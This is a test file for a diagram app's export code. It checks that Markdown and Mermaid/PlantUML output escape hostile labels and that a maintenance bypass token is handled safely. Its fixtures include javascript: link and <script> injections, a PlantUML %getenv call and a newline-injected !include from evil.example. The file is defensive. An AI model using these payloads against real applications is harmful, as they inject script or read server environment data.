import { describe, expect, it } from "vitest";
import { codeForView } from "@/lib/diagram/exportCode";
import { solutionDocument } from "@/lib/diagram/exportDocument";
import { exportViews } from "@/lib/diagram/exportPlan";
import { createBlankDiagram } from "@/lib/diagram/factory";
import { MIN_BYPASS_TOKEN_LENGTH, readMaintenanceConfig, safeEqual } from "@/lib/maintenance";
import type { Diagram, DiagramNode } from "@/lib/diagram/types";

/** Files come from anyone. What they say must stay text in everything the app writes out. */
function hostile(label: string, extra: Record<string, unknown> = {}): Diagram {
  const node = {
    id: "a",
    type: "block",
    position: { x: 0, y: 0 },
    size: { width: 100, height: 50 },
    data: { kind: "block", label, containerId: null, ...extra },
  } as DiagramNode;
  const diagram = createBlankDiagram("Plan");
  diagram.sections[0] = { ...diagram.sections[0], name: "Current", nodes: [node] };
  return diagram;
}

describe("solution document", () => {
  it("keeps a typed link from becoming a Markdown link, image or HTML", () => {
    const doc = solutionDocument(hostile("[click](javascript:alert(1))", { description: "![x](https://evil.example/p.png) <script>alert(1)</script> **bold** `code`" }));
    expect(doc).not.toMatch(/(^|[^\\])\[click\]\(/);
    expect(doc).toContain("\\[click\\]");
    expect(doc).not.toMatch(/(^|[^\\])!\[x\]\(/);
    expect(doc).not.toContain("<script>");
    expect(doc).toContain("&lt;script&gt;");
    expect(doc).not.toMatch(/(^|[^\\])\*\*bold/);
  });

  it("can't end a link early to start another from a web address", () => {
    const address = "https://a.example/x)[click](javascript:alert(1)";
    const doc = solutionDocument(hostile("Web", { link: address }));
    // Every bracket and parenthesis inside the target is percent-encoded, so the link ends where it should.
    expect(doc).toContain("(https://a.example/x%29%5Bclick%5D%28javascript:alert%281%29)");
    expect(doc).not.toMatch(/(^|[^\\])\]\(javascript:/);
  });

  it("shows a link that isn't a web address as plain text", () => {
    const doc = solutionDocument(hostile("Web", { link: "javascript:alert(1)" }));
    expect(doc).not.toMatch(/(^|[^\\])\]\(javascript:/);
  });

  it("encodes picture file names that contain brackets or parentheses", () => {
    const diagram = hostile("Web");
    const view = exportViews(diagram)[0];
    expect(solutionDocument(diagram, { images: new Map([[view.id, "plan (final) [1].png"]]) })).toContain("![Current](plan%20%28final%29%20%5B1%5D.png)");
  });
});

describe("diagram code", () => {
  it("keeps PlantUML from running preprocessor functions found in a name", () => {
    const diagram = hostile('Web %getenv("HOME") "quoted"');
    const code = codeForView(diagram, exportViews(diagram)[0], "plantuml")!;
    expect(code).not.toContain("%getenv");
    expect(code).toContain("<U+0025>getenv");
    expect(code.split("\n").filter((line) => line.startsWith("!"))).toEqual(["!include <C4/C4_Container>"]);
  });

  it("keeps a multi-line name from starting a new line of code", () => {
    const diagram = hostile('Web\n!include https://evil.example/x.puml\nclick n1 call alert()');
    for (const format of ["mermaid", "plantuml"] as const) {
      const code = codeForView(diagram, exportViews(diagram)[0], format)!;
      expect(code.split("\n").some((line) => /^\s*(!include https|click )/.test(line))).toBe(false);
    }
  });
});

describe("maintenance bypass token", () => {
  it("compares without stopping at the first difference", () => {
    expect(safeEqual("abcdef", "abcdef")).toBe(true);
    expect(safeEqual("abcdef", "abcdeg")).toBe(false);
    expect(safeEqual("abc", "abcdef")).toBe(false);
    expect(safeEqual("", "")).toBe(true);
    expect(safeEqual("", "x")).toBe(false);
  });

  it("ignores a token too short to be safe", () => {
    expect(readMaintenanceConfig({ MAINTENANCE_MODE: "on", MAINTENANCE_BYPASS_TOKEN: "preview" }).bypassToken).toBeNull();
    const long = "x".repeat(MIN_BYPASS_TOKEN_LENGTH);
    expect(readMaintenanceConfig({ MAINTENANCE_MODE: "on", MAINTENANCE_BYPASS_TOKEN: ` ${long} ` }).bypassToken).toBe(long);
  });
});
